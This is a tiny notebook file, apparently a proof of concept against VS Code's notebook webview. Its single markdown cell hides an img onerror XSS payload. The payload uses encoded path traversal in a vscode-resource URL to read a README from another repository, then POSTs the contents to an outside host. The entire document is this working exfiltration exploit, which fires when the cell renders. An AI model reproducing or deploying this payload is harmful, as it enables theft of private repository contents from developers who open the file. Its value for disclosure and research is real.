# %% [markdown]
# <img src="data:foobar" onerror='
# console.log("Fetching...");
# fetch("https://vscode-vfs+github-002b7b2276223a312c22726566223a7b2274797065223a352c226964223a226d61696e227d7d.vscode-resource.vscode-cdn.net/ammaraskar/private-repo/..%2F../ammaraskar-bug-test/public-repo-2/README.md")
#   .then(res => res.text())
#   .then(text => {
#     console.log(text);
#     fetch("https://ammaraskar.com", {method: "POST", mode: "no-cors", body: text});
#   })
# ' >
